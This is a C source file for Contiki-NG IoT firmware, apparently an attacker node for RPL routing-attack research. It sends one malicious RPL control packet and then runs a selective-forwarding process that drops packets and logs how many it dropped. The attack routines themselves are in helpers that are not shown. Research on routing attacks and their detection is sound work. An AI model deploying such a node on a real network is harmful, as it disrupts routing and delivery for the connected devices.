#include "contiki.h"
#include "random.h"
#include "net/netstack.h"
#include "net/routing/rpl-lite/rpl-timers.h"
#include "net/routing/rpl-lite/rpl-icmp6-malicious.h"
//#define LOG_MODULE "App"
//#define LOG_LEVEL LOG_LEVEL_INFO
#define SEND_INTERVAL		  (65 * CLOCK_SECOND)
#define ATTACK_START          SEND_INTERVAL

/*---------------------------------------------------------------------------*/
PROCESS(udp_client_process, "UDP client");
PROCESS(selecting_process, "Selector");
AUTOSTART_PROCESSES(&udp_client_process);
/*---------------------------------------------------------------------------*/

PROCESS_THREAD(udp_client_process, ev, data)
{
  static struct etimer periodic_timer;
  static bool first = true;
  PROCESS_BEGIN();

  /* Init of flooding node stats */
  init_select();
  
  etimer_set(&periodic_timer, SEND_INTERVAL);
  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    //We just want to send the RPL packet once
    if (first) {
        first = false;
        malicious_output(1);
    }
    else { //in the next timer expiration, start flood attack process & stop this timer
        etimer_stop(&periodic_timer);    
        process_start(&selecting_process, NULL);
    }
    /* Add some jitter */
    etimer_set(&periodic_timer, SEND_INTERVAL
      - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
  }
  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(selecting_process, ev, data)
{
  static struct etimer timer;
  PROCESS_BEGIN();
  
  start_filtering(); //selecting mode on

  etimer_set(&timer, CLOCK_SECOND);
  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    if (selecting) {
        /* Launch attack */
        printf("UDP packets dropped: %d\n", packets_dropped);
        printf ("ICMP packets dropped: %d, forwarded: %d\n",icmp_dropped, icmp_sent);
       // etimer_stop(&timer);
       etimer_reset(&timer);
    }
  }
  PROCESS_END();
}
